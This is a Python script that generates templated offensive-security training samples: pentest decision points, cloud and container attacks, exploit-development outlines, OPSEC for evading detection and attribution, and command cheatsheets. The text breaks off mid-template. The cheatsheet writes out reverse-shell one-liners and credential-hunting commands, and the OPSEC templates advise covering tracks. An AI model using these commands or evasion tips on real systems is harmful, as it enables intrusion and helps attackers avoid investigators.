#!/usr/bin/env python3
"""
Elite Dataset Part 2 - Additional 7000+ samples
Focus: Advanced scenarios, edge cases, and specialized domains
"""

import json
import random
from pathlib import Path

output_dir = Path(__file__).parent.parent / "data" / "generated" / "elite2"
output_dir.mkdir(parents=True, exist_ok=True)

# =============================================================================
# 1. ADVANCED REASONING CHAINS (800 samples)
# =============================================================================

reasoning_samples = []

attack_decisions = [
    {
        "situation": "You have local admin on a workstation. Domain controller is on a separate VLAN.",
        "options": ["credential dumping", "network enumeration", "persistence first"],
        "factors": ["time constraints", "detection risk", "scope requirements"],
        "best_choice": "credential dumping",
        "reasoning": "Credentials enable lateral movement across VLAN boundaries via legitimate protocols"
    },
    {
        "situation": "Web application has SQLi but database user has minimal privileges.",
        "options": ["enumerate further", "attempt privilege escalation", "look for other vulns"],
        "factors": ["database type", "available functions", "connected systems"],
        "best_choice": "enumerate further",
        "reasoning": "Understanding the database environment may reveal escalation paths or connected resources"
    },
    {
        "situation": "EDR detected your initial payload but hasn't blocked your access yet.",
        "options": ["continue carefully", "abort and reassess", "switch techniques immediately"],
        "factors": ["SOC response time", "detection scope", "mission criticality"],
        "best_choice": "switch techniques immediately",
        "reasoning": "Detection likely triggered alert; switching techniques buys time before SOC responds"
    },
    {
        "situation": "Found a service account with SPN but also has 'Do not require Kerberos preauth' set.",
        "options": ["Kerberoast", "AS-REP roast", "both attacks"],
        "factors": ["password policy", "cracking resources", "detection monitoring"],
        "best_choice": "AS-REP roast",
        "reasoning": "AS-REP roasting is less commonly monitored and doesn't require TGT first"
    },
    {
        "situation": "You've compromised an Azure VM. You see it has a Managed Identity assigned.",
        "options": ["query IMDS for token", "pivot to other VMs", "exfiltrate local data"],
        "factors": ["MI permissions", "connected resources", "detection logging"],
        "best_choice": "query IMDS for token",
        "reasoning": "Managed Identity tokens can provide access to Azure resources without credentials on disk"
    },
]

for i in range(800):
    decision = random.choice(attack_decisions)
    option_idx = random.randint(0, len(decision["options"]) - 1)
    chosen = decision["options"][option_idx]
    
    reasoning_samples.append({
        "instruction": "Analyze this penetration testing decision point.",
        "input": f"Situation: {decision['situation']}\nOptions: {', '.join(decision['options'])}\nFactors to consider: {', '.join(decision['factors'])}",
        "output": f"""**Decision Analysis**

**Situation**: {decision['situation']}

**Available Options**:
{chr(10).join(f"- {opt}" for opt in decision['options'])}

**Factor Analysis**:
{chr(10).join(f"- **{factor}**: Critical consideration for choosing approach" for factor in decision['factors'])}

**Evaluation of Each Option**:

1. **{decision['options'][0]}**
   - Pros: Direct approach to objective
   - Cons: May trigger detection mechanisms
   - Risk Level: Medium

2. **{decision['options'][1]}**
   - Pros: Builds situational awareness
   - Cons: Time consuming, may be noticed
   - Risk Level: Low-Medium

3. **{decision['options'][2]}**
   - Pros: Ensures fallback options
   - Cons: Delays primary objective
   - Risk Level: Low

**Recommended Action**: {decision['best_choice']}

**Reasoning**: {decision['reasoning']}

**Implementation**:
1. Prepare necessary tools/commands
2. Validate current access is stable
3. Execute chosen technique with OPSEC
4. Verify success before proceeding
5. Document for reporting

**Fallback Plan**: If {decision['best_choice']} fails, proceed to next viable option."""
    })

with open(output_dir / "reasoning_chains.jsonl", "w") as f:
    for sample in reasoning_samples:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(reasoning_samples)} reasoning chain samples")

# =============================================================================
# 2. ENVIRONMENT-SPECIFIC ATTACKS (700 samples)
# =============================================================================

env_samples = []

environments = {
    "Kubernetes": [
        ("pod escape", "container breakout", "node compromise"),
        ("RBAC abuse", "excessive permissions", "cluster admin"),
        ("secrets extraction", "etcd access", "credential theft"),
        ("service account token", "mounted JWT", "API server access"),
        ("node metadata", "cloud provider IMDS", "cloud credential theft"),
    ],
    "Docker": [
        ("privileged container", "full host access", "escape to host"),
        ("socket mount", "/var/run/docker.sock", "container creation"),
        ("capability abuse", "CAP_SYS_ADMIN", "host filesystem access"),
        ("image poisoning", "malicious base image", "supply chain attack"),
        ("secrets in image", "environment variables", "credential extraction"),
    ],
    "CI/CD": [
        ("pipeline injection", "malicious PR", "code execution"),
        ("secret extraction", "environment variables", "credential theft"),
        ("artifact poisoning", "build output manipulation", "supply chain"),
        ("runner compromise", "self-hosted runner", "infrastructure access"),
        ("OIDC abuse", "federated identity", "cloud access"),
    ],
    "Serverless": [
        ("function injection", "event data manipulation", "code execution"),
        ("permission escalation", "excessive IAM", "privilege escalation"),
        ("cold start timing", "initialization abuse", "information disclosure"),
        ("event source manipulation", "trigger exploitation", "unauthorized execution"),
        ("layer poisoning", "shared dependency", "supply chain attack"),
    ],
}

for i in range(700):
    env = random.choice(list(environments.keys()))
    attack = random.choice(environments[env])
    
    env_samples.append({
        "instruction": f"Explain {env} security attack: {attack[0]}",
        "input": f"Vector: {attack[1]}. Goal: {attack[2]}",
        "output": f"""**{env} Security Attack**: {attack[0].title()}

**Environment**: {env}
**Attack Vector**: {attack[1]}
**Objective**: {attack[2]}

**Prerequisites**:
- Access to {env} environment
- Understanding of {env} architecture
- Reconnaissance of target configuration

**Attack Methodology**:

**Phase 1: Enumeration**
- Identify {env} version and configuration
- Map available permissions and access
- Discover misconfigurations

**Phase 2: Exploitation**
- Vector: {attack[1]}
- Leverage misconfiguration or vulnerability
- Achieve initial objective

**Phase 3: Escalation**
- Goal: {attack[2]}
- Chain with additional techniques
- Establish persistence if needed

**Technical Details**:
```bash
# {env}-specific commands for attack
# [Relevant CLI/API calls would be here]
```

**Detection Indicators**:
- {env} audit logs showing unusual activity
- API calls outside normal patterns
- Resource modifications

**{env}-Specific Mitigations**:
- Implement least privilege
- Enable comprehensive logging
- Use {env} security features
- Regular configuration audits

**Impact Assessment**:
- Scope: {env} environment and connected systems
- Data at risk: Secrets, configurations, workloads
- Business impact: Service disruption, data breach

**MITRE ATT&CK Mapping**:
- Technique: Relevant container/cloud technique
- Tactic: Corresponding tactic phase"""
    })

with open(output_dir / "environment_specific.jsonl", "w") as f:
    for sample in env_samples:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(env_samples)} environment-specific samples")

# =============================================================================
# 3. VULNERABILITY RESEARCH (600 samples)
# =============================================================================

vuln_research = []

vuln_classes = [
    ("buffer overflow", "stack-based", "memory corruption", "control flow hijack"),
    ("buffer overflow", "heap-based", "chunk metadata", "arbitrary write"),
    ("use-after-free", "dangling pointer", "object reuse", "code execution"),
    ("type confusion", "object type mismatch", "memory corruption", "arbitrary RW"),
    ("integer overflow", "arithmetic error", "buffer size calculation", "memory corruption"),
    ("race condition", "TOCTOU", "timing window", "privilege escalation"),
    ("deserialization", "untrusted data", "object injection", "code execution"),
    ("path traversal", "directory escape", "file access", "information disclosure"),
    ("command injection", "shell metacharacters", "OS command execution", "system compromise"),
    ("SSRF", "server-side request", "internal access", "cloud metadata theft"),
]

for i in range(600):
    vuln = random.choice(vuln_classes)
    
    vuln_research.append({
        "instruction": f"Analyze vulnerability class: {vuln[0]} ({vuln[1]})",
        "input": f"Trigger: {vuln[2]}. Impact: {vuln[3]}",
        "output": f"""**Vulnerability Research**: {vuln[0].title()} - {vuln[1].title()}

**Classification**: Memory Corruption / Logic Error
**Trigger Mechanism**: {vuln[2]}
**Ultimate Impact**: {vuln[3]}

**Technical Deep Dive**:

**Root Cause**:
{vuln[0]} occurs when {vuln[2]} leads to unintended program behavior. In the {vuln[1]} variant, the specific mechanism involves manipulation of {vuln[2]}.

**Exploitation Requirements**:
1. Identify vulnerable code path
2. Control input reaching vulnerable function
3. Craft payload achieving {vuln[3]}
4. Bypass mitigations (ASLR, DEP, CFI)

**Memory Layout Analysis**:
```
[Before trigger]
| Normal state |
[After trigger]
| Corrupted state → {vuln[3]} |
```

**Exploitation Primitives**:
- Initial corruption: {vuln[2]}
- Arbitrary read: Information leak for ASLR bypass
- Arbitrary write: Overwrite control structure
- Code execution: {vuln[3]}

**Modern Mitigations**:
- Stack canaries (for stack-based)
- ASLR (address randomization)
- DEP/NX (non-executable memory)
- CFI (control flow integrity)
- Safe unlinking (heap protections)

**Bypass Techniques**:
- Information leaks for ASLR
- ROP/JOP for DEP bypass
- Partial overwrites
- Heap spraying

**Detection**:
- Static analysis tools
- Fuzzing with sanitizers
- Runtime instrumentation
- Code review focus areas

**Remediation**:
- Input validation
- Safe memory functions
- Compiler protections
- Sandboxing"""
    })

with open(output_dir / "vuln_research.jsonl", "w") as f:
    for sample in vuln_research:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(vuln_research)} vulnerability research samples")

# =============================================================================
# 4. OPERATIONAL SECURITY (OPSEC) (600 samples)
# =============================================================================

opsec_samples = []

opsec_scenarios = [
    ("infrastructure setup", "attack infrastructure", "avoid attribution"),
    ("payload delivery", "initial access", "evade detection"),
    ("c2 communication", "command and control", "blend with traffic"),
    ("data exfiltration", "data theft", "avoid DLP"),
    ("credential usage", "lateral movement", "avoid honey tokens"),
    ("persistence", "maintaining access", "survive reboots"),
    ("log management", "covering tracks", "avoid forensics"),
    ("time management", "operation timing", "blend with patterns"),
]

for i in range(600):
    scenario = random.choice(opsec_scenarios)
    
    opsec_samples.append({
        "instruction": f"OPSEC considerations for: {scenario[0]}",
        "input": f"Phase: {scenario[1]}. Goal: {scenario[2]}",
        "output": f"""**Operational Security Analysis**: {scenario[0].title()}

**Operation Phase**: {scenario[1]}
**OPSEC Objective**: {scenario[2]}

**Threat Model**:
- **Adversary**: SOC/Blue Team, threat intel, law enforcement
- **Capabilities**: Log analysis, NDR, EDR, threat hunting
- **Objectives**: Detection, attribution, disruption

**OPSEC Principles for {scenario[0]}**:

**1. Minimize Footprint**
- Use only necessary tools/techniques
- Limit data touched/transferred
- Reduce time in environment

**2. Blend with Normal**
- Match legitimate traffic patterns
- Use expected protocols and ports
- Operate during business hours

**3. Compartmentalization**
- Separate attack infrastructure
- Don't cross-contaminate operations
- Use distinct identities

**4. Deny Attribution**
- Clean metadata from files
- Use anonymizing technologies
- Avoid identifiable patterns

**Specific Recommendations for {scenario[1]}**:

**DO**:
- {scenario[2]} using legitimate protocols
- Test detection thresholds before full execution
- Maintain operational flexibility

**DON'T**:
- Use known-bad indicators
- Generate unusual traffic volumes
- Leave obvious artifacts

**Detection Avoidance**:
- EDR: Living-off-the-land techniques
- NDR: Encrypted, legitimate-looking traffic
- SIEM: Stay below alert thresholds
- Hunting: Avoid known threat actor TTPs

**If Burned**:
1. Stop immediately
2. Assess exposure scope
3. Switch infrastructure/techniques
4. Wait appropriate cooldown period

**Metrics**:
- Track detection events
- Monitor for incident response
- Adjust TTPs based on feedback"""
    })

with open(output_dir / "opsec.jsonl", "w") as f:
    for sample in opsec_samples:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(opsec_samples)} OPSEC samples")

# =============================================================================
# 5. THREAT INTELLIGENCE (500 samples)
# =============================================================================

threat_intel = []

apt_groups = [
    ("APT28", "Russia", "government/military", "spearphishing, zero-days"),
    ("APT29", "Russia", "government/research", "supply chain, watering hole"),
    ("APT41", "China", "multiple sectors", "supply chain, living-off-land"),
    ("Lazarus", "North Korea", "financial/crypto", "spearphishing, malware"),
    ("FIN7", "Cybercrime", "retail/hospitality", "phishing, POS malware"),
    ("REvil", "Cybercrime", "ransomware", "RaaS, data extortion"),
    ("Conti", "Cybercrime", "ransomware", "RaaS, double extortion"),
    ("Scattered Spider", "Cybercrime", "tech/telecom", "social engineering, SIM swap"),
]

for i in range(500):
    apt = random.choice(apt_groups)
    
    threat_intel.append({
        "instruction": f"Threat intelligence brief: {apt[0]}",
        "input": f"Attribution: {apt[1]}. Targets: {apt[2]}. TTPs: {apt[3]}",
        "output": f"""**Threat Actor Profile**: {apt[0]}

**Attribution**: {apt[1]}
**Target Sectors**: {apt[2]}
**Primary TTPs**: {apt[3]}

**Overview**:
{apt[0]} is a {"nation-state sponsored" if apt[1] not in ["Cybercrime"] else "financially motivated"} threat actor known for sophisticated operations targeting {apt[2]} organizations.

**Tactics, Techniques, and Procedures**:

**Initial Access**:
- {apt[3].split(',')[0].strip()}
- Exploitation of public-facing applications
- Valid credential use

**Execution**:
- PowerShell and scripting
- Native OS utilities
- Custom malware deployment

**Persistence**:
- Registry modifications
- Scheduled tasks
- Implant deployment

**Evasion**:
- Living-off-the-land binaries
- Code signing abuse
- Timestomping

**Command and Control**:
- HTTPS beaconing
- Domain fronting
- Legitimate service abuse

**Indicators of Compromise**:
- Known domains/IPs (would list specific)
- File hashes for tools
- Registry keys and paths
- Network signatures

**Detection Opportunities**:
- Monitor for TTPs listed above
- Hunt for known IoCs
- Behavioral analysis

**Recommended Mitigations**:
- Implement MFA everywhere
- Application whitelisting
- Network segmentation
- Enhanced logging and monitoring

**References**:
- MITRE ATT&CK Group: GXXXX
- Threat intelligence reports
- Incident response case studies"""
    })

with open(output_dir / "threat_intel.jsonl", "w") as f:
    for sample in threat_intel:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(threat_intel)} threat intel samples")

# =============================================================================
# 6. SECURE CODE REVIEW (600 samples)
# =============================================================================

code_review = []

vuln_patterns = [
    ("SQL Injection", "Python", "f\"SELECT * FROM users WHERE id = {user_input}\"", 
     "cursor.execute(\"SELECT * FROM users WHERE id = ?\", (user_input,))"),
    ("SQL Injection", "Java", "\"SELECT * FROM users WHERE id = \" + userId", 
     "PreparedStatement with parameterized query"),
    ("XSS", "JavaScript", "element.innerHTML = userInput", 
     "element.textContent = userInput or proper encoding"),
    ("Command Injection", "Python", "os.system(f'ping {host}')", 
     "subprocess.run(['ping', host], shell=False)"),
    ("Path Traversal", "Python", "open(base_dir + user_file)", 
     "os.path.join with validation against traversal"),
    ("Insecure Deserialization", "Python", "pickle.loads(untrusted_data)", 
     "json.loads or validated input"),
    ("Hardcoded Credentials", "Any", "password = 'admin123'", 
     "Environment variables or secrets manager"),
    ("Weak Cryptography", "Any", "MD5 or SHA1 for passwords", 
     "bcrypt, scrypt, or Argon2"),
]

for i in range(600):
    pattern = random.choice(vuln_patterns)
    
    code_review.append({
        "instruction": f"Code review: Identify and fix {pattern[0]}",
        "input": f"Language: {pattern[1]}\nVulnerable code:\n```\n{pattern[2]}\n```",
        "output": f"""**Security Code Review Finding**

**Vulnerability**: {pattern[0]}
**Language**: {pattern[1]}
**Severity**: High

**Vulnerable Code**:
```{pattern[1].lower()}
{pattern[2]}
```

**Issue Analysis**:
This code is vulnerable to {pattern[0]} because user-controlled input is directly incorporated without proper validation or sanitization.

**Attack Scenario**:
1. Attacker provides malicious input
2. Input is processed without sanitization
3. Vulnerability is triggered
4. Attacker achieves unauthorized action

**Proof of Concept**:
```
# Malicious input example
[Attack payload demonstrating the vulnerability]
```

**Remediation**:

**Fixed Code**:
```{pattern[1].lower()}
{pattern[3]}
```

**Why This Fixes It**:
- Separates code from data
- Uses platform security features
- Validates/sanitizes input

**Additional Recommendations**:
1. Input validation at entry points
2. Output encoding at exit points
3. Principle of least privilege
4. Defense in depth

**Testing**:
- Add unit tests for malicious input
- Include in SAST scanning
- Manual penetration testing

**References**:
- OWASP {pattern[0]} Prevention Cheatsheet
- CWE-XXX (specific weakness enumeration)
- Secure coding guidelines for {pattern[1]}"""
    })

with open(output_dir / "code_review.jsonl", "w") as f:
    for sample in code_review:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(code_review)} code review samples")

# =============================================================================
# 7. NETWORK ANALYSIS (500 samples)
# =============================================================================

network_samples = []

network_scenarios = [
    ("packet capture analysis", "Wireshark", "identify malicious traffic"),
    ("traffic decryption", "TLS interception", "analyze encrypted streams"),
    ("protocol analysis", "custom protocol", "understand communication"),
    ("C2 detection", "beacon patterns", "identify command and control"),
    ("data exfiltration", "DNS tunneling", "detect covert channels"),
    ("lateral movement", "SMB traffic", "track attacker movement"),
    ("credential theft", "NTLM hashes", "capture authentication"),
    ("man-in-the-middle", "ARP spoofing", "intercept traffic"),
]

for i in range(500):
    scenario = random.choice(network_scenarios)
    
    network_samples.append({
        "instruction": f"Network security analysis: {scenario[0]}",
        "input": f"Tool/Method: {scenario[1]}. Objective: {scenario[2]}",
        "output": f"""**Network Security Analysis**: {scenario[0].title()}

**Methodology**: {scenario[1]}
**Objective**: {scenario[2]}

**Analysis Approach**:

**1. Capture Setup**:
- Position: Network tap, span port, or inline
- Filters: Relevant traffic only
- Storage: Sufficient for analysis duration

**2. Traffic Analysis**:
Using {scenario[1]} to {scenario[2]}:

**Key Indicators**:
- Protocol anomalies
- Unusual port usage
- Traffic volume patterns
- Timing characteristics

**Analysis Techniques**:
```
# Filter examples for {scenario[0]}
# Protocol-specific filters
# Statistical analysis commands
```

**What to Look For**:
1. **Baseline Deviation**: Traffic outside normal patterns
2. **Known Indicators**: Signatures of malicious activity
3. **Behavioral Anomalies**: Unusual communication patterns
4. **Data Patterns**: Encoded/encrypted payloads

**Tools**:
- Wireshark for packet analysis
- tcpdump for capture
- Zeek for protocol logging
- NetworkMiner for extraction

**Findings Documentation**:
- Timeline of events
- Source/destination mapping
- Protocol breakdown
- Payload extraction

**Response Actions**:
- Block malicious IPs/domains
- Isolate affected systems
- Preserve evidence
- Report findings

**Prevention**:
- Network segmentation
- Traffic encryption
- IDS/IPS deployment
- Regular monitoring"""
    })

with open(output_dir / "network_analysis.jsonl", "w") as f:
    for sample in network_samples:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(network_samples)} network analysis samples")

# =============================================================================
# 8. MALWARE ANALYSIS (600 samples)
# =============================================================================

malware_samples = []

malware_types = [
    ("ransomware", "file encryption", "AES/RSA encryption routine"),
    ("RAT", "remote access", "command handler loop"),
    ("keylogger", "credential theft", "keyboard hook"),
    ("rootkit", "persistence/hiding", "kernel hooks"),
    ("botnet", "C2 communication", "beacon routine"),
    ("dropper", "payload delivery", "download and execute"),
    ("worm", "self-propagation", "network scanning"),
    ("cryptominer", "resource theft", "mining algorithm"),
]

analysis_types = ["static", "dynamic", "behavioral"]

for i in range(600):
    malware = random.choice(malware_types)
    analysis = random.choice(analysis_types)
    
    malware_samples.append({
        "instruction": f"Malware analysis: {malware[0]} ({analysis} analysis)",
        "input": f"Primary function: {malware[1]}. Key component: {malware[2]}",
        "output": f"""**Malware Analysis Report**: {malware[0].title()}

**Analysis Type**: {analysis.title()}
**Primary Function**: {malware[1]}
**Key Component**: {malware[2]}

**{analysis.title()} Analysis Methodology**:

{"**Static Analysis**:" if analysis == "static" else ""}
{f'''
- File type identification (PE, ELF, script)
- String extraction for IoCs
- Import/export analysis
- Code disassembly review
- Signature matching
''' if analysis == "static" else ""}

{"**Dynamic Analysis**:" if analysis == "dynamic" else ""}
{f'''
- Sandbox execution monitoring
- API call tracing
- Network traffic capture
- File system changes
- Registry modifications
''' if analysis == "dynamic" else ""}

{"**Behavioral Analysis**:" if analysis == "behavioral" else ""}
{f'''
- Long-term execution monitoring
- Trigger condition identification
- Evasion technique observation
- Full capability mapping
''' if analysis == "behavioral" else ""}

**Key Findings**:

**1. {malware[2].title()} Analysis**:
- Location in binary/code
- Implementation details
- Triggering conditions

**2. Capabilities**:
- Primary: {malware[1]}
- Secondary functions discovered
- Evasion techniques used

**3. Indicators of Compromise**:
- File hashes (MD5, SHA256)
- Network indicators (IPs, domains)
- Host indicators (files, registry)
- Behavioral signatures

**YARA Rule**:
```yara
rule {malware[0].replace(' ', '_')} {{
    meta:
        description = "{malware[0]} detection"
    strings:
        $string1 = "characteristic_string"
    condition:
        uint16(0) == 0x5A4D and $string1
}}
```

**MITRE ATT&CK Mapping**:
- Relevant techniques for {malware[0]}

**Recommendations**:
- Detection signatures to deploy
- Blocking rules for prevention
- Hunting queries for environment"""
    })

with open(output_dir / "malware_analysis.jsonl", "w") as f:
    for sample in malware_samples:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(malware_samples)} malware analysis samples")

# =============================================================================
# 9. EXPLOIT DEVELOPMENT (500 samples)
# =============================================================================

exploit_samples = []

exploit_scenarios = [
    ("stack buffer overflow", "x86-64 Linux", "return address overwrite", "ROP chain"),
    ("heap overflow", "glibc", "chunk metadata corruption", "arbitrary write"),
    ("format string", "printf family", "stack data leak", "GOT overwrite"),
    ("use-after-free", "heap allocator", "object vtable", "fake object"),
    ("integer overflow", "size calculation", "heap overflow", "controlled allocation"),
    ("type confusion", "JavaScript engine", "type mismatch", "arbitrary RW primitive"),
    ("race condition", "kernel", "double-fetch", "privilege escalation"),
    ("logic bug", "web application", "authentication bypass", "admin access"),
]

for i in range(500):
    exploit = random.choice(exploit_scenarios)
    
    exploit_samples.append({
        "instruction": f"Exploit development: {exploit[0]} on {exploit[1]}",
        "input": f"Primitive: {exploit[2]}. Technique: {exploit[3]}",
        "output": f"""**Exploit Development Analysis**

**Vulnerability**: {exploit[0]}
**Target**: {exploit[1]}
**Initial Primitive**: {exploit[2]}
**Exploitation Technique**: {exploit[3]}

**Development Process**:

**Phase 1: Vulnerability Analysis**
- Root cause identification
- Trigger conditions
- Controllable parameters
- Reliability assessment

**Phase 2: Primitive Development**
- {exploit[2]}
- Convert to useful primitive
- Achieve stable exploitation

**Phase 3: Mitigation Bypass**
- ASLR: Information leak required
- DEP/NX: ROP/JOP gadgets
- Stack Canaries: Leak or bypass
- CFI: Find allowed control flow

**Phase 4: Payload Execution**
- Technique: {exploit[3]}
- Stage shellcode/payload
- Achieve code execution

**Technical Details**:

**Memory Layout**:
```
[Before exploit]
+----------------+
| Normal state   |
+----------------+

[After exploit]
+----------------+
| Controlled     |
| execution      |
+----------------+
```

**Exploitation Steps**:
1. Trigger vulnerability condition
2. Control {exploit[2]}
3. Use {exploit[3]} technique
4. Execute payload

**Reliability Considerations**:
- Heap layout predictability
- Timing requirements
- Multiple attempts needed?
- Target-specific offsets

**PoC Structure**:
```python
# Exploit skeleton
def trigger_vuln():
    # Trigger {exploit[0]}
    pass

def leak_info():
    # Bypass ASLR
    pass

def achieve_execution():
    # {exploit[3]}
    pass
```

**Testing**:
- Debug environment setup
- Crash analysis
- Success verification

**References**:
- Related CVEs
- Research papers
- Prior art"""
    })

with open(output_dir / "exploit_dev.jsonl", "w") as f:
    for sample in exploit_samples:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(exploit_samples)} exploit development samples")

# =============================================================================
# 10. COMPLIANCE & FRAMEWORKS (400 samples)
# =============================================================================

compliance_samples = []

frameworks = [
    ("NIST CSF", "Identify, Protect, Detect, Respond, Recover", "risk management"),
    ("ISO 27001", "ISMS implementation", "information security management"),
    ("PCI DSS", "cardholder data protection", "payment security"),
    ("HIPAA", "PHI protection", "healthcare compliance"),
    ("SOC 2", "Trust Service Criteria", "service organization controls"),
    ("GDPR", "data subject rights", "privacy compliance"),
    ("CIS Controls", "prioritized security actions", "cyber defense"),
    ("MITRE ATT&CK", "adversary tactics and techniques", "threat-informed defense"),
]

for i in range(400):
    framework = random.choice(frameworks)
    
    compliance_samples.append({
        "instruction": f"Explain security framework: {framework[0]}",
        "input": f"Core concept: {framework[1]}. Focus area: {framework[2]}",
        "output": f"""**Security Framework Overview**: {framework[0]}

**Core Concept**: {framework[1]}
**Primary Focus**: {framework[2]}

**Framework Summary**:
{framework[0]} provides structured guidance for {framework[2]} through defined controls and practices.

**Key Components**:

{f'''**{framework[0]} Structure**:
- Foundation elements
- Implementation guidelines
- Assessment criteria
- Continuous improvement''' if True else ''}

**Implementation Approach**:

1. **Assessment**
   - Current state evaluation
   - Gap analysis
   - Risk identification

2. **Planning**
   - Prioritize controls
   - Resource allocation
   - Timeline development

3. **Implementation**
   - Control deployment
   - Process establishment
   - Technology integration

4. **Monitoring**
   - Continuous assessment
   - Metrics collection
   - Improvement tracking

**Penetration Testing Relevance**:
- Tests control effectiveness
- Validates security posture
- Identifies gaps in implementation
- Provides evidence for audits

**Mapping to Pentest Activities**:
- Reconnaissance → Asset inventory validation
- Vulnerability assessment → Control gap identification
- Exploitation → Control effectiveness testing
- Reporting → Compliance evidence

**Common Findings**:
- Control implementation gaps
- Documentation deficiencies
- Process inconsistencies
- Technical vulnerabilities

**Reporting Alignment**:
Structure pentest findings to map to {framework[0]} requirements for easier remediation tracking and compliance reporting.

**Resources**:
- Official {framework[0]} documentation
- Implementation guides
- Assessment tools
- Training materials"""
    })

with open(output_dir / "compliance.jsonl", "w") as f:
    for sample in compliance_samples:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(compliance_samples)} compliance/framework samples")

# =============================================================================
# 11. IOT & EMBEDDED SECURITY (400 samples)
# =============================================================================

iot_samples = []

iot_attacks = [
    ("firmware extraction", "UART/JTAG access", "extract and analyze firmware"),
    ("firmware analysis", "binwalk extraction", "find vulnerabilities"),
    ("hardware hacking", "debug interface", "gain root access"),
    ("protocol fuzzing", "malformed packets", "crash or exploit"),
    ("MQTT exploitation", "broker misconfiguration", "message interception"),
    ("BLE attacks", "GATT enumeration", "device manipulation"),
    ("Zigbee attacks", "network sniffing", "command injection"),
    ("OTA hijacking", "update interception", "malicious firmware"),
]

for i in range(400):
    attack = random.choice(iot_attacks)
    
    iot_samples.append({
        "instruction": f"IoT/Embedded security assessment: {attack[0]}",
        "input": f"Method: {attack[1]}. Goal: {attack[2]}",
        "output": f"""**IoT/Embedded Security Assessment**

**Technique**: {attack[0].title()}
**Methodology**: {attack[1]}
**Objective**: {attack[2]}

**Assessment Approach**:

**1. Reconnaissance**
- Device identification
- Interface enumeration
- Protocol discovery
- Documentation review

**2. Physical Analysis**
- PCB inspection
- Component identification
- Debug port location
- Flash chip mapping

**3. {attack[0].title()}**
- {attack[1]}
- Tool selection
- Technique execution
- {attack[2]}

**Technical Details**:

**Tools Required**:
- Hardware: Logic analyzer, UART adapter, JTAG debugger
- Software: Binwalk, Ghidra, firmware-mod-kit
- Protocol tools: Wireshark, specific protocol analyzers

**Attack Steps**:
1. Identify target interface/protocol
2. Establish communication/access
3. Execute {attack[1]}
4. Achieve {attack[2]}

**Common Vulnerabilities**:
- Hardcoded credentials
- Unencrypted communications
- Debug interfaces enabled
- Insecure update mechanisms
- Weak authentication

**Impact Assessment**:
- Device compromise
- Network pivot point
- Data theft
- Physical safety implications

**Mitigations**:
- Disable debug interfaces in production
- Implement secure boot
- Encrypt firmware
- Strong authentication
- Network segmentation

**Reporting**:
- Document physical access requirements
- Reproducible steps
- Risk assessment
- Remediation timeline"""
    })

with open(output_dir / "iot_embedded.jsonl", "w") as f:
    for sample in iot_samples:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(iot_samples)} IoT/embedded samples")

# =============================================================================
# 12. PURPLE TEAM EXERCISES (400 samples)
# =============================================================================

purple_samples = []

exercises = [
    ("credential dumping detection", "Mimikatz execution", "LSASS access monitoring"),
    ("lateral movement tracking", "PsExec usage", "service creation logs"),
    ("persistence detection", "scheduled task creation", "4698 event correlation"),
    ("exfiltration identification", "DNS tunneling", "query length analysis"),
    ("C2 detection", "Cobalt Strike beacon", "malleable C2 signatures"),
    ("privilege escalation", "token manipulation", "SeDebugPrivilege usage"),
    ("defense evasion", "AMSI bypass", "script block logging"),
    ("initial access simulation", "phishing payload", "email gateway testing"),
]

for i in range(400):
    exercise = random.choice(exercises)
    
    purple_samples.append({
        "instruction": f"Purple team exercise: {exercise[0]}",
        "input": f"Red action: {exercise[1]}. Blue detection: {exercise[2]}",
        "output": f"""**Purple Team Exercise Report**

**Objective**: {exercise[0].title()}

**Red Team Action**: {exercise[1]}
**Blue Team Detection**: {exercise[2]}

**Exercise Design**:

**Red Team Execution**:
1. Prepare {exercise[1]} technique
2. Execute under controlled conditions
3. Document exact timing and artifacts
4. Vary technique parameters

**Blue Team Monitoring**:
1. Enable {exercise[2]}
2. Monitor for indicators
3. Document detection timing
4. Analyze gaps

**Collaboration Points**:

**Before Execution**:
- Agree on scope and timing
- Ensure logging is active
- Establish communication channel

**During Execution**:
- Red executes technique
- Blue monitors in real-time
- Document observations
- Iterate with variations

**After Execution**:
- Compare timelines
- Analyze detection gaps
- Identify improvements
- Document findings

**Metrics**:
- Time to detect
- Alert fidelity (TP/FP ratio)
- Coverage gaps
- Detection bypass success

**Detection Tuning**:
Based on exercise:
- Adjust alert thresholds
- Add new detection rules
- Improve correlation logic
- Update playbooks

**Red Team Feedback**:
- What worked for evasion
- Detection indicators observed
- Technique variations to test

**Blue Team Feedback**:
- Detection effectiveness
- Alert noise levels
- Response capability

**Outcome**:
- Improved detection for {exercise[1]}
- Updated {exercise[2]} rules
- Better purple team collaboration
- Documented playbook updates"""
    })

with open(output_dir / "purple_team.jsonl", "w") as f:
    for sample in purple_samples:
        f.write(json.dumps(sample) + "\n")
print(f"Generated {len(purple_samples)} purple team samples")

# =============================================================================
# 13. COMMAND CHEATSHEETS (500 samples)
# =============================================================================

cheatsheet_samples = []

command_categories = [
    ("Linux enumeration", "system information", ["uname -a", "cat /etc/os-release", "hostname", "id", "whoami"]),
    ("Windows enumeration", "system information", ["systeminfo", "whoami /all", "hostname", "net user"]),
    ("Network discovery", "host enumeration", ["nmap -sn 192.168.1.0/24", "arp -a", "netstat -an"]),
    ("File transfer", "data movement", ["curl -O http://url", "wget http://url", "scp file user@host:"]),
    ("Reverse shells", "remote access", ["bash -i >& /dev/tcp/IP/PORT 0>&1", "nc -e /bin/sh IP PORT"]),
    ("Privilege check", "escalation vectors", ["sudo -l", "find / -perm -4000", "getcap -r / 2>/dev/null"]),
    ("Process handling", "execution control", ["ps aux", "pstree", "jobs", "nohup command &"]),
    ("Credential hunting", "password discovery", ["grep -r password /etc/", "find / -name *.conf"]),
]

for i in range(500):
    category = random.choice(command_categories)
    
    cheatsheet_samples.append({
        "instruction": f"Provide {category[0]} commands",
        "input": f"Purpose: {category[1]}",
        "output": f"""**Command Cheatsheet**: {category[0].title()}

**Purpose**: {category[1]}

**Essential Commands**:

